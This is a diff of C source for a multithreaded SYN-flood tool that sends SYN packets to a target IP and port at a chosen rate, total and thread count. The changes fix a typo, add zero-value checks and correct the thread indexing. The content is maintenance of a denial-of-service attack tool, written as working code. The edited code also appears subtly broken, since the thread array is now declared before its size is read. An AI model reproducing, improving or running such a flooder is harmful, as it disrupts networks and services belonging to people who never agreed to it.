@@ -157,6 +157,7 @@ void *flood(void *arg){
 	int     number = 0;
 	if( sleeptime == 0 )
 	{
+		printf("sleep time is 0\n");
 		while( (signed)outcount > 0 ){
 			//printf("current thread tid is %u,%lld\n",(unsigned)pthread_self(),outcount);
 			Init( sock, &packet );
@@ -200,14 +201,16 @@ int main(int argc,char *argv[])
 	if( argc != 7 )
 	{
 		fprintf(stderr,"\n%s <target ip> <target port> <pkt_then_sleep> <sleep_time> <pkt_sum> <thread_sum>\n", argv[0]);
-		fprintf(stderr, "send syn packets to <target ip>:<target port>, sleep <sleep_time> microseconds per <pkt_then_sleep> paskets,send sum <pkt_sum>,use <thread_sum> thread\n\n");
+		fprintf(stderr, "send syn packets to <target ip>:<target port>, sleep <sleep_time> microseconds per <pkt_then_sleep> packets,send sum <pkt_sum>,use <thread_sum> thread\n\n");
 	       	return -1;
 	}
 	strncpy( dst_ip, argv[1], 16 );
 	dst_port = atoi( argv[2] );
 	pkt_then_sleep = atoi(argv[3]);
-	pkt_sum = outcount = atoi(argv[5]);
-	th_count = atoi(argv[6]);
+	if( !(pkt_sum = outcount = atoi(argv[5])) ){
+		printf( "sum packet is 0 error.\n" );
+		return -1;
+	}
 
 	if( inet_addr(dst_ip) == INADDR_NONE )
 	{      
@@ -255,18 +258,21 @@ int main(int argc,char *argv[])
 	signal(SIGTTOU,&sig_proc);
 	
 	pthread_t thread[th_count];
-	int tnum = th_count;
+	int tnum =1; 
+	if( !(tnum = th_count = atoi(argv[6])) ){
+		printf( "thread count is 0 error.\n" );
+		return -1;
+	}
+
 	while(tnum){
-		pthread_create(&thread[tnum],NULL,flood,NULL);
+		pthread_create(&thread[--tnum],NULL,flood,NULL);
 //		printf("%d\t%d\n",th_count,thread[th_count]);
-		tnum--;
 	}	
 
 	tnum = th_count;
 
 	while(tnum){
-		pthread_join(thread[th_count],NULL);
-		tnum--;
+		pthread_join(thread[--tnum],NULL);
 	}
 
 	//flood(NULL);
